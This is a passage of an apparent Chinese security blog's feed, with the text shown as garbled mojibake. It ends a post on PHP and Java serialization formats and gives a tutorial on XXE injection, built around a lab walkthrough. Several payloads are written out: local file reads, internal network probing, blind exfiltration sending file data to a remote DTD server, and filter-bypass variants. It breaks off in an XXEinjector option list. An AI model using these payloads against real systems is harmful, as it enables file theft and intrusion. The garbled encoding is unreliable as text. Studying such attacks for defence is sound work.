Oä»£è¡¨å¯¹è±¡ï¼›4ä»£è¡¨å¯¹è±¡åé•¿åº¦ï¼›2ä»£è¡¨2ä¸ªæˆå‘˜å˜é‡ï¼›å…¶ä½™å‚ç…§å¦‚ä¸‹</p><table><thead><tr><th align="center">ç±»å‹</th><th align="center">ç»“æ„</th></tr></thead><tbody><tr><td align="center">String</td><td align="center">s:size:value;</td></tr><tr><td align="center">Integer</td><td align="center">i:value;</td></tr><tr><td align="center">Boolean</td><td align="center">b:value;(ä¿å­˜1æˆ–0)</td></tr><tr><td align="center">Null</td><td align="center">N;</td></tr><tr><td align="center">Array</td><td align="center">a:size:</td></tr><tr><td align="center">Object</td><td align="center">O:strlen(object name):object name:object size:</td></tr></tbody></table><h4 id="publicã€protectedã€privateä¸‹åºåˆ—åŒ–å¯¹è±¡çš„åŒºåˆ«"><a href="#publicã€protectedã€privateä¸‹åºåˆ—åŒ–å¯¹è±¡çš„åŒºåˆ«" class="headerlink" title="publicã€protectedã€privateä¸‹åºåˆ—åŒ–å¯¹è±¡çš„åŒºåˆ«"></a>publicã€protectedã€privateä¸‹åºåˆ—åŒ–å¯¹è±¡çš„åŒºåˆ«</h4><p>php v7.xååºåˆ—åŒ–çš„æ—¶å€™å¯¹è®¿é—®ç±»åˆ«ä¸æ•æ„Ÿ</p><ul><li>publicå˜é‡<br>ç›´æ¥å˜é‡åååºåˆ—åŒ–å‡ºæ¥</li><li>protectedå˜é‡<br><code>\x00 + * + \x00 + å˜é‡å</code><br>å¯ä»¥ç”¨<code>S:5:&quot;\00*\00op&quot;</code>æ¥ä»£æ›¿<code>s:5:&quot;?*?op&quot;</code></li><li>privateå˜é‡<br><code>\x00 + ç±»å + \x00 + å˜é‡å</code></li></ul><h2 id="JAVAååºåˆ—åŒ–"><a href="#JAVAååºåˆ—åŒ–" class="headerlink" title="JAVAååºåˆ—åŒ–"></a>JAVAååºåˆ—åŒ–</h2><p>ä¸‹æ–¹çš„ç‰¹å¾å¯ä»¥ä½œä¸ºåºåˆ—åŒ–çš„æ ‡å¿—å‚è€ƒ:</p><ul><li><p>ä¸€æ®µæ•°æ®ä»¥<code>rO0AB</code>å¼€å¤´ï¼Œä½ åŸºæœ¬å¯ä»¥ç¡®å®šè¿™ä¸²å°±æ˜¯JAVAåºåˆ—åŒ–base64åŠ å¯†çš„æ•°æ®ã€‚</p></li><li><p>æˆ–è€…å¦‚æœä»¥<code>aced</code>å¼€å¤´ï¼Œé‚£ä¹ˆä»–å°±æ˜¯è¿™ä¸€æ®µjavaåºåˆ—åŒ–çš„16è¿›åˆ¶</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ååºåˆ—åŒ–&quot;&gt;&lt;a href=&quot;#ååºåˆ—åŒ–&quot; class=&quot;headerlink&quot; title=&quot;ååºåˆ—åŒ–&quot;&gt;&lt;/a&gt;ååºåˆ—åŒ–&lt;/h1&gt;&lt;h2 id=&quot;PHP-ååºåˆ—åŒ–&quot;&gt;&lt;a href=&quot;#PHP-ååºåˆ—åŒ–&quot; class=&quot;headerlink&quot; title=&quot;P</summary>
      
    
    
    
    <category term="Web" scheme="https://iahzl.github.io/categories/Web/"/>
    
    
    <category term="PHP" scheme="https://iahzl.github.io/tags/PHP/"/>
    
    <category term="Java" scheme="https://iahzl.github.io/tags/Java/"/>
    
    <category term="unserialize" scheme="https://iahzl.github.io/tags/unserialize/"/>
    
  </entry>
  
  <entry>
    <title>XML XXEæ¼æ´</title>
    <link href="https://iahzl.github.io/XML-XXE%E6%BC%8F%E6%B4%9E/"/>
    <id>https://iahzl.github.io/XML-XXE%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-08-05T08:23:23.000Z</published>
    <updated>2023-08-05T08:39:22.839Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XML-XXEæ¼æ´"><a href="#XML-XXEæ¼æ´" class="headerlink" title="XML XXEæ¼æ´"></a>XML XXEæ¼æ´</h1><h2 id="åŸºç¡€æ¦‚å¿µ"><a href="#åŸºç¡€æ¦‚å¿µ" class="headerlink" title="åŸºç¡€æ¦‚å¿µ"></a>åŸºç¡€æ¦‚å¿µ</h2><h3 id="1ã€xmlåŸºç¡€æ¦‚å¿µ"><a href="#1ã€xmlåŸºç¡€æ¦‚å¿µ" class="headerlink" title="1ã€xmlåŸºç¡€æ¦‚å¿µ"></a>1ã€xmlåŸºç¡€æ¦‚å¿µ</h3><p>XMLè¢«è®¾è®¡ä¸ºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼ŒXMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰(å¯é€‰)ã€æ–‡æ¡£å…ƒç´ ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ï¼Œå…¶æŠŠæ•°æ®ä»HTMLåˆ†ç¦»ï¼Œæ˜¯ç‹¬ç«‹äºè½¯ä»¶å’Œç¡¬ä»¶çš„ä¿¡æ¯ä¼ è¾“å·¥å…·ã€‚XXEæ¼æ´å…¨ç§°XMLExternal Entity Injectionï¼Œå³xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼ŒXXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰å±å®³ã€‚</p><h3 id="2ã€XMLä¸HTMLçš„ä¸»è¦å·®å¼‚"><a href="#2ã€XMLä¸HTMLçš„ä¸»è¦å·®å¼‚" class="headerlink" title="2ã€XMLä¸HTMLçš„ä¸»è¦å·®å¼‚"></a>2ã€XMLä¸HTMLçš„ä¸»è¦å·®å¼‚</h3><p>XMLè¢«è®¾è®¡ä¸ºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ã€‚</p><p>HTMLè¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚ã€‚</p><p>HTMLæ—¨åœ¨æ˜¾ç¤ºä¿¡æ¯ï¼Œè€ŒXMLæ—¨åœ¨ä¼ è¾“ä¿¡æ¯ã€‚</p><h3 id="3ã€xmlç¤ºä¾‹"><a href="#3ã€xmlç¤ºä¾‹" class="headerlink" title="3ã€xmlç¤ºä¾‹"></a>3ã€xmlç¤ºä¾‹</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--æ–‡æ¡£ç±»å‹å®šä¹‰--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [&lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ—¶noteç±»å‹çš„æ–‡æ¡£--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span>&lt;!--å®šä¹‰noteå…ƒç´ æœ‰å››ä¸ªå…ƒç´ --&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span>&lt;!--å®šä¹‰toå…ƒç´ ä¸º&quot;#PCDATA&quot;ç±»å‹--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span>&lt;!--å®šä¹‰fromå…ƒç´ ä¸º&quot;#PCDATA&quot;ç±»å‹--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">head</span> (<span class="keyword">#PCDATA</span>)&gt;</span>&lt;!--å®šä¹‰headå…ƒç´ ä¸º&quot;#PCDATA&quot;ç±»å‹--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span>&lt;!--å®šä¹‰bodyå…ƒç´ ä¸º&quot;#PCDATA&quot;ç±»å‹--&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--æ–‡æ¡£å…ƒç´ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>DTDï¼šDocument Type Definition  å³æ–‡æ¡£ç±»å‹å®šä¹‰ï¼Œç”¨æ¥ä¸ºXMLæ–‡æ¡£å®šä¹‰è¯­ä¹‰çº¦æŸã€‚å¯ä»¥åµŒå…¥åœ¨XMLæ–‡æ¡£ä¸­(å†…éƒ¨å£°æ˜)ï¼Œä¹Ÿå¯ä»¥ç‹¬ç«‹çš„æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­(å¤–éƒ¨å¼•ç”¨)ï¼Œç”±äºå…¶æ”¯æŒçš„æ•°æ®ç±»å‹æœ‰é™ï¼Œæ— æ³•å¯¹å…ƒç´ æˆ–å±æ€§çš„å†…å®¹è¿›è¡Œè¯¦ç»†è§„èŒƒï¼Œåœ¨å¯è¯»æ€§å’Œå¯æ‰©å±•æ€§æ–¹é¢ä¹Ÿæ¯”ä¸ä¸ŠXML Schemaã€‚</p><p>DTDä¸€èˆ¬è®¤ä¸ºæœ‰ä¸¤ç§å¼•ç”¨æˆ–å£°æ˜æ–¹å¼ï¼š</p><ul><li>1ã€å†…éƒ¨DTDï¼šå³å¯¹XMLæ–‡æ¡£ä¸­çš„å…ƒç´ ã€å±æ€§å’Œå®ä½“çš„DTDçš„å£°æ˜éƒ½åœ¨XMLæ–‡æ¡£ä¸­ã€‚</li><li>2ã€å¤–éƒ¨DTDï¼šå³å¯¹XMLæ–‡æ¡£ä¸­çš„å…ƒç´ ã€å±æ€§å’Œå®ä½“çš„DTDçš„å£°æ˜éƒ½åœ¨ä¸€ä¸ªç‹¬ç«‹çš„DTDæ–‡ä»¶ï¼ˆ.dtdï¼‰ä¸­ã€‚</li></ul><p>DTDå®ä½“æœ‰ä»¥ä¸‹å‡ ç§å£°æ˜æ–¹å¼</p><h3 id="å†…éƒ¨å®ä½“"><a href="#å†…éƒ¨å®ä½“" class="headerlink" title="å†…éƒ¨å®ä½“"></a>å†…éƒ¨å®ä½“</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY a <span class="string">&quot;admin&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>&amp;a<span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- admin --&gt;</span></span><br></pre></td></tr></table></figure><h3 id="å‚æ•°å®ä½“"><a href="#å‚æ•°å®ä½“" class="headerlink" title="å‚æ•°å®ä½“"></a>å‚æ•°å®ä½“</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY % b <span class="string">&quot;&lt;!ENTITY b1 &quot;</span>awsl<span class="string">&quot;&gt;&quot;</span>&gt;</span></span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>&amp;b1<span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- awsl --&gt;</span></span><br></pre></td></tr></table></figure><ul><li>å‚æ•°å®ä½“ç”¨<code>% name</code>ç”³æ˜ï¼Œå¼•ç”¨æ—¶ç”¨<code>%name;</code>ï¼Œåªèƒ½åœ¨DTDä¸­ç”³æ˜ï¼ŒDTDä¸­å¼•ç”¨ã€‚</li><li>å…¶ä½™å®ä½“ç›´æ¥ç”¨<code>name</code>ç”³æ˜ï¼Œå¼•ç”¨æ—¶ç”¨<code>&amp;name;</code>ï¼Œåªèƒ½åœ¨DTDä¸­ç”³æ˜ï¼Œå¯åœ¨xmlæ–‡æ¡£ä¸­å¼•ç”¨</li></ul><h3 id="å¤–éƒ¨å®ä½“"><a href="#å¤–éƒ¨å®ä½“" class="headerlink" title="å¤–éƒ¨å®ä½“"></a>å¤–éƒ¨å®ä½“</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY c <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>&amp;c<span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;</span></span><br></pre></td></tr></table></figure><p>å¤–éƒ¨å¼•ç”¨å¯æ”¯æŒhttpï¼Œfileç­‰åè®®ï¼Œä¸åŒçš„è¯­è¨€æ”¯æŒçš„åè®®ä¸åŒï¼Œä½†å­˜åœ¨ä¸€äº›é€šç”¨çš„åè®®ï¼Œå…·ä½“å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729103931875.png" alt="image-20230729103931875"></p><p>ä¸Šå›¾æ˜¯é»˜è®¤æ”¯æŒåè®®ï¼Œè¿˜å¯ä»¥æ”¯æŒå…¶ä»–ï¼Œå¦‚PHPæ”¯æŒçš„æ‰©å±•åè®®æœ‰</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230805163325966.png" alt="image-20230805163325966"></p><h3 id="é¶åœºè®²è§£-pikachu-xxeæ¼æ´"><a href="#é¶åœºè®²è§£-pikachu-xxeæ¼æ´" class="headerlink" title="é¶åœºè®²è§£ (pikachu xxeæ¼æ´)"></a>é¶åœºè®²è§£ (pikachu xxeæ¼æ´)</h3><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729102633777.png" alt="image-20230729102633777"></p><ol><li>æ–‡ä»¶è¯»å–</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [    </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///d:/test.txt&quot;</span> &gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230805163353148.png" alt="image-20230805163353148"></p><ol start="2"><li>å†…ç½‘æ¢é’ˆæˆ–æ”»å‡»å†…ç½‘åº”ç”¨ï¼ˆè§¦å‘æ¼æ´åœ°å€ï¼‰</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTYTY <span class="keyword">rabbit</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.1.4:80/index.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;rabbit;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ipåœ°å€å‡è®¾å°±æ˜¯å†…ç½‘çš„ä¸€å°æœåŠ¡å™¨çš„ipåœ°å€ã€‚è¿˜å¯ä»¥è¿›è¡Œä¸€ä¸ªç«¯å£æ‰«æï¼Œçœ‹ä¸€ä¸‹ç«¯å£æ˜¯å¦å¼€æ”¾ã€‚</p><p><strong>æ— å›æ˜¾-è¯»å–æ–‡ä»¶</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.xx.xxx:80XX/test.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test.dtd:</span><br><span class="line">&lt;!ENTITY % payload</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM</span><br><span class="line">&#x27;http://192.168.xx.xxx:80xx/?data=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„urlä¸€èˆ¬æ˜¯è‡ªå·±çš„ç½‘ç«™ï¼Œé€šè¿‡ç¬¬ä¸€æ­¥è®¿é—®æ–‡ä»¶ï¼Œç„¶åå†è®¿é—®dtdæ–‡ä»¶ï¼ŒæŠŠè¯»å–åˆ°çš„æ•°æ®èµ‹ç»™dataï¼Œç„¶åæˆ‘ä»¬åªéœ€è¦å†è‡ªå·±çš„ç½‘ç«™æ—¥å¿—ï¼Œæˆ–è€…å†™ä¸ªphpè„šæœ¬ä¿å­˜ä¸‹æ¥ï¼Œå°±èƒ½çœ‹åˆ°è¯»å–åˆ°çš„æ–‡ä»¶æ•°æ®äº†ã€‚</p><h2 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h2><h3 id="ENTITY-SYSTEM-fileç­‰å…³é”®è¯è¢«è¿‡æ»¤"><a href="#ENTITY-SYSTEM-fileç­‰å…³é”®è¯è¢«è¿‡æ»¤" class="headerlink" title="ENTITY SYSTEM fileç­‰å…³é”®è¯è¢«è¿‡æ»¤"></a>ENTITY SYSTEM fileç­‰å…³é”®è¯è¢«è¿‡æ»¤</h3><p>ä½¿ç”¨ç¼–ç æ–¹å¼ç»•è¿‡ï¼šUTF-16BE<br> <code>cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml</code></p><p>è‹¥httpè¢«è¿‡æ»¤ï¼Œå¯ä»¥</p><h3 id="data-åè®®ç»•è¿‡"><a href="#data-åè®®ç»•è¿‡" class="headerlink" title="data:&#x2F;&#x2F;åè®®ç»•è¿‡"></a>data:&#x2F;&#x2F;åè®®ç»•è¿‡</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="string">&quot; &lt;!ENTITY %  b SYSTEM &#x27;http://118.25.14.40:8200/hack.dtd&#x27;&gt; &quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">    %b;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;hhh;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="file-åè®®åŠ æ–‡ä»¶ä¸Šä¼ "><a href="#file-åè®®åŠ æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="file:&#x2F;&#x2F;åè®®åŠ æ–‡ä»¶ä¸Šä¼ "></a>file:&#x2F;&#x2F;åè®®åŠ æ–‡ä»¶ä¸Šä¼ </h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--ä¸Šä¼ æ–‡ä»¶--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % b <span class="keyword">SYSTEM</span> <span class="string">&#x27;http://118.25.14.40:8200/hack.dtd&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="php-filteråè®®åŠ æ–‡ä»¶ä¸Šä¼ "><a href="#php-filteråè®®åŠ æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="php:&#x2F;&#x2F;filteråè®®åŠ æ–‡ä»¶ä¸Šä¼ "></a>php:&#x2F;&#x2F;filteråè®®åŠ æ–‡ä»¶ä¸Šä¼ </h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;hhh;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--ä¸Šä¼ æ–‡ä»¶--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">hhh</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % a <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;hhh;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--ä¸Šä¼ æ–‡ä»¶--&gt;</span></span><br><span class="line">PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==</span><br></pre></td></tr></table></figure><h1 id="xxeå·¥å…·"><a href="#xxeå·¥å…·" class="headerlink" title="xxeå·¥å…·"></a>xxeå·¥å…·</h1><p>â€‹          XXEinjectoræœ¬èº«æä¾›äº†éå¸¸éå¸¸ä¸°å¯Œçš„æ“ä½œé€‰é¡¹ï¼Œæ‰€ä»¥å¤§å®¶åœ¨åˆ©ç”¨XXEinjectorè¿›è¡Œæ¸—é€æµ‹è¯•ä¹‹å‰ï¼Œè¯·è‡ªä¹ äº†è§£è¿™äº›é…ç½®é€‰é¡¹ï¼Œä»¥æœ€å¤§é™åº¦åœ°å‘æŒ¥XXEinjectorçš„åŠŸèƒ½ã€‚å½“ç„¶äº†ï¼Œç”±äºXXEinjectoræ˜¯åŸºäºRubyå¼€å‘çš„ï¼Œæ‰€ä»¥Rubyè¿è¡Œç¯å¢ƒå°±æ˜¯å¿…é¡»çš„äº†ã€‚è¿™é‡Œå»ºè®®åœ¨kaliç¯å¢ƒä¸‹è¿è¡Œã€‚</p><h2 id="å‚æ•°è¯´æ˜"><a href="#å‚æ•°è¯´æ˜" class="headerlink" title="å‚æ•°è¯´æ˜"></a>å‚æ•°è¯´æ˜</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">--host     å¿…å¡«é¡¹â€“ ç”¨äºå»ºç«‹åå‘é“¾æ¥çš„IPåœ°å€ã€‚(--host=192.168.0.2)</span><br><span class="line">--file      å¿…å¡«é¡¹- 